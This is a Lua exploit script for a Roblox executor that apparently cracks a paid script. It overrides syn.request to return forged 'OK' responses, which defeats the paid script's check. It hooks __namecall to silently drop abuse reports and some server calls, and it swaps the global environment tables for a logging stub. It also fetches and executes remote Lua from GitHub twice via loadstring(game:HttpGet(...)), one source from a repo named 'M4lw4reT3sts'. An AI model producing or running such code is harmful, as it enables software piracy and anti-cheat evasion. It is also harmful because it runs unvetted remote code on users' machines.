--[[
    This shit costs 250 robux btw

    their new loader is this I think https://github.com/trollfacenan/a/blob/main/0x94jG8jflajb8xk3p099cn.lua
    I will try to use this instead
    


    -- https://discord.gg/Eb92DeZear --
]]
do
    local _ = function(t) 
    if not t then error"invalid argument #1 to '?' (table excepted, got no value)"
    elseif not t.Url then error"Invalid or no 'Url' field specified in request table"
    end
    print('syn.request Url:',t.Url)
    local _ = {}
    if t.Body then 
        _ = {
            url = "http://pornhub.com/";
            origin = "69.69.1337.000";
            args = {};
            files = {};
            form = {};
            data = '';
            headers = {
                ['Content-Type'] = 'application/x-www-form-urlencoded';
                ['Syn-Fingerprint'] = 'rip bozo';
                ['Syn-User-Identifier'] = 'rip bozo';
                ['User-Agent'] = '';
                ['X-Amzn-Trace-Id'] = '';
                ['Content-Length'] = 0;
                Accept = '*/*';
                Cookie = '';
                Host = 'pornhub.com';
            };
}
    end
    return setmetatable(
        _,
        {
            __index = function(kv,v)
                print('syn.request __index:',v)
                return ({
                    StatusMessage = 'OK';
                    Success = true;
                    StatusCode = 200;
                    Body = [[{"args":{},"data":"","files":{},"form":{},"headers":{"Accept":"*/*","Content-Length":"0","Content-Type":"application/x-www-form-urlencoded","Cookie":"","Host":"pornhub.com","Syn-Fingerprint":"rip bozo","Syn-User-Identifier":"rip bozo","User-Agent":"synx/no","X-Amzn-Trace-Id":"no"},"json":null,"origin": "69.69.1337.000","url":"http://pornhub.com/"}]];
                    Cookies = {};
                    Headers = {}
                })[v]
            end
        }
    )
end
    if syn then
        setreadonly(syn,false)
        syn.request = _
        setreadonly(syn,true)
    else
        http_request = _
    end
end
local _;_=hookmetamethod(game,'__namecall',function(...)local _0=getnamecallmethod():lower();if _0=='reportabuse'or _0=='fireserver'and checkcaller''then return end;return _(...)end)
local bozo_hack = setmetatable({},{__newindex = print})
_G = bozo_hack
getgenv = function(...)
    print"getgenv() was called"
    return bozo_hack
end
shared = bozo_hack
getrenv()._G = bozo_hack
getrenv().shared = bozo_hack
loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/script/main/SCV2ERER.lua'),true))() --you can actually take any file from there it will work
__securereeq = function(...)
    print('__securereeq function: '.. ...)
    return true
end --delete it its probably useless
chat = function(...)
    print('---chat function---')
    table.foreach({...},print)
    print('---chat function---\n')
end --delete it its probably useless
VPPVtGqW = function(...)
    print('VPPVtGqW function: '.. ...)
end
omnWymoCHPUb = bozo_hack

loadstring(game:HttpGet'https://raw.githubusercontent.com/opencupfangirl/looks-fun-U8Kpaf1JA1/main/Oldify%20Script.txt')()
